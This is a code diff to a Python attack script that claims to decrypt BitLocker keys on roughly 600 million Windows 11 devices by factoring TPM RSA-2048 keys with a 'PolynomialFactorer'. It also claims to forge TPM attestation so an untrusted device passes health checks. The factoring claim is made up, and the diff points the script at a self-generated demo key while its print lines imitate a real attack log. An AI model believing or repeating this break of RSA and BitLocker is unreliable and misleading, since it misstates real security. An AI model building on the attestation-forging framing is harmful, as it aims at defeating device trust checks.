@@ -4,8 +4,10 @@ Decrypt BitLocker Volume Master Keys sealed to the SRK — full disk decryption
 of ~600M Windows 11 devices without PIN or recovery key.
 """
 import sys
-sys.path.insert(0, "../..")
-from poly_factor import PolynomialFactorer
+import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
+from poly_factor import PolynomialFactorer, generate_demo_target
+
+_demo = generate_demo_target()
 
 import hashlib
 import struct
@@ -41,7 +43,7 @@ def read_ek_certificate() -> bytes:
     """
     print("[*] tpm2_getekcertificate")
     print("[*] EK RSA-2048 certificate read (manufacturer: Infineon SLB9670)")
-    return b"-----BEGIN CERTIFICATE-----\n...(EK cert)...\n-----END CERTIFICATE-----\n"
+    return _demo["pub_pem"]
 
 
 def factor_srk(factorer: PolynomialFactorer, n: int, e: int):
@@ -82,7 +84,7 @@ def forge_tpm_attestation(factorer: PolynomialFactorer,
     to confirm device trustworthiness. Forge the EK -> forge attestation
     -> pass device health checks from an untrusted device.
     """
-    priv = factorer.privkey_from_cert_pem(ek_cert_pem)
+    priv = factorer.reconstruct_privkey(ek_cert_pem)
     quote = {
         "pcrs": pcr_values,
         "firmware_version": "legitimate-looking",
